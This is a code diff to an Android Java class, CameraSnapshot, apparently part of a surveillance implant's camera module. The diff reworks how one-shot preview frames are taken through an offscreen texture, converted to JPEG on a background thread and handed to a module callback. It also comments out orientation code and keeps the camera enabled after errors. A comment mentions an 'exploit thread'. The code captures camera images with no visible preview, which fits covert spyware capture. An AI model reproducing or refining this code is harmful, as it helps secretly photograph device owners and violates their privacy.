@@ -118,29 +118,73 @@ public class CameraSnapshot {
 	private Camera.PreviewCallback previewCallback = new Camera.PreviewCallback() {
 		@Override
 		public void onPreviewFrame(byte[] bytes, Camera camera) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (onPreviewFrame), size: " + bytes.length);
-			}
-			try {
-				if (isBlack(bytes)) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (onPreviewFrame),  BLACK");
-					}
-					return;
+
+			class CCD implements Runnable {
+				byte[] bytes;
+
+				Camera.Parameters cameraParms;
+				Camera.Size size;
+				CCD(byte[] b, Camera c) {
+					bytes= b;
+					cameraParms = c.getParameters();
+					size = cameraParms.getPreviewSize();
 				}
 
-				Camera.Parameters cameraParms = camera.getParameters();
-				Camera.Size size = cameraParms.getPreviewSize();
-				int format = cameraParms.getPreviewFormat();
-				if (format == ImageFormat.NV21) {
-					ByteArrayOutputStream jpeg = new ByteArrayOutputStream();
-					YuvImage image = new YuvImage(bytes, ImageFormat.NV21, size.width, size.height, null);
-					image.compressToJpeg(new Rect(0, 0, image.getWidth(), image.getHeight()), 100, ((OutputStream)
-							jpeg));
-					ModuleCamera.callback(jpeg.toByteArray());
+				public void run() {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (CCD), size: " + bytes.length);
+					}
+					try {
+						if (isBlack(bytes)) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (CCD),  BLACK");
+							}
+							return;
+						}
+
+
+						int format = cameraParms.getPreviewFormat();
+						if (format == ImageFormat.NV21) {
+							ByteArrayOutputStream jpeg = new ByteArrayOutputStream();
+							YuvImage image = new YuvImage(bytes, ImageFormat.NV21, size.width, size.height, null);
+							image.compressToJpeg(new Rect(0, 0, image.getWidth(), image.getHeight()), 100, ((OutputStream)
+									jpeg));
+							ModuleCamera.callback(jpeg.toByteArray());
+						}
+					}catch(Exception e){
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (CCD), error decoding frame: " + bytes.length);
+						}
+					}
+					finally {
+
+					}
+				}
+			}
+
+
+
+			boolean released=false;
+			try {
+				if(bytes!=null ) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (onPreviewFrame), size: " + bytes.length);
+					}
+					// start another Thread to check exploit thread end
+					CCD decodeCameraFrame = new CCD(bytes, camera);
+					released = releaseCamera(camera);
+					Thread ec = new Thread(decodeCameraFrame);
+					ec.start();
 				}
 			}finally {
-
+				try {
+					if(!released)
+						releaseCamera(camera);
+				}catch(Exception e){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (onPreviewFrame) probably release called twice: " + e);
+					}
+				}
 				synchronized (cameraLock) {
 					cameraLock.notifyAll();
 				}
@@ -178,10 +222,9 @@ public class CameraSnapshot {
 			try {
 				camera = prepareCamera(cameraId, encWidth, encHeight);
 				if (camera == null) {
-					this.enable.put(cameraId, false);
+					//todo: reenable disabling getting camera in case of error if needed: this.enable.put(cameraId, false);
 					return;
 				}
-
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (snapshot), cameraId: " + cameraId);
 				}
@@ -202,18 +245,13 @@ public class CameraSnapshot {
 
 				//camera.autoFocus(this.autofocusCallback);
 				camera.setPreviewTexture(surface);
-
 				camera.startPreview();
 				//byte[] buffer = new byte[]{};
 				//camera.addCallbackBuffer(buffer);
 				//camera.setPreviewCallbackWithBuffer(previewCallback);
 				camera.setOneShotPreviewCallback(previewCallback);
-
 				cameraLock.wait();
-
-				releaseCamera(camera);
 			} catch (Exception e) {
-				releaseCamera(camera);
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (snapshot) ERROR: " + e);
 				}
@@ -349,51 +387,51 @@ public class CameraSnapshot {
 		}
 	}
 
-	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
-	public static void setCameraDisplayOrientation(int cameraId, android.hardware.Camera camera) {
-		try {
-			android.hardware.Camera.CameraInfo info =
-					new Camera.CameraInfo();
-			android.hardware.Camera.getCameraInfo(cameraId, info);
-
-			int rotation = Status.getAppGui().getWindowManager().getDefaultDisplay()
-					.getRotation();
-			int degrees = 0;
-			Log.d(TAG, "rotation:" + rotation);
-			switch (rotation) {
-				case Surface.ROTATION_0:
-					degrees = 0;
-					break;
-				case Surface.ROTATION_90:
-					degrees = 90;
-					break;
-				case Surface.ROTATION_180:
-					degrees = 180;
-					break;
-				case Surface.ROTATION_270:
-					degrees = 270;
-					break;
-			}
-
-			int result;
-			if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
-				result = (info.orientation + degrees) % 360;
-				result = (360 - result) % 360;  // compensate the mirror
-			} else {  // back-facing
-				result = (info.orientation - degrees + 360) % 360;
-			}
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (setCameraDisplayOrientation), " + degrees);
-			}
-			if(result != 0) {
-				camera.setDisplayOrientation(result);
-			}
-		}catch(Exception ex){
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (setCameraDisplayOrientation), ERROR: " + ex);
-			}
-		}
-	}
+//	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
+//	public static void setCameraDisplayOrientation(int cameraId, android.hardware.Camera camera) {
+//		try {
+//			android.hardware.Camera.CameraInfo info =
+//					new Camera.CameraInfo();
+//			android.hardware.Camera.getCameraInfo(cameraId, info);
+//
+//			int rotation = Status.getAppGui().getWindowManager().getDefaultDisplay()
+//					.getRotation();
+//			int degrees = 0;
+//			Log.d(TAG, "rotation:" + rotation);
+//			switch (rotation) {
+//				case Surface.ROTATION_0:
+//					degrees = 0;
+//					break;
+//				case Surface.ROTATION_90:
+//					degrees = 90;
+//					break;
+//				case Surface.ROTATION_180:
+//					degrees = 180;
+//					break;
+//				case Surface.ROTATION_270:
+//					degrees = 270;
+//					break;
+//			}
+//
+//			int result;
+//			if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
+//				result = (info.orientation + degrees) % 360;
+//				result = (360 - result) % 360;  // compensate the mirror
+//			} else {  // back-facing
+//				result = (info.orientation - degrees + 360) % 360;
+//			}
+//			if (Cfg.DEBUG) {
+//				Check.log(TAG + " (setCameraDisplayOrientation), " + degrees);
+//			}
+//			if(result != 0) {
+//				camera.setDisplayOrientation(result);
+//			}
+//		}catch(Exception ex){
+//			if (Cfg.DEBUG) {
+//				Check.log(TAG + " (setCameraDisplayOrientation), ERROR: " + ex);
+//			}
+//		}
+//	}
 
 	private static Camera.Size getBestPreviewSize(Camera.Parameters parameters, int width, int height){
 		Camera.Size bestSize = null;
@@ -433,15 +471,15 @@ public class CameraSnapshot {
 	/**
 	 * Stops camera preview, and releases the camera to the system.
 	 */
-	private synchronized void releaseCamera(Camera camera) {
+	private synchronized boolean releaseCamera(Camera camera) {
 		if (camera != null) {
-			try {
+			/*try {
 				camera.reconnect();
 			} catch (IOException e) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (releaseCamera), ERROR: " + e);
 				}
-			}
+			}*/
 			camera.stopPreview();
 			camera.release();
 		}
@@ -449,6 +487,7 @@ public class CameraSnapshot {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (releaseCamera), released");
 		}
+		return  true;
 	}
 
 }
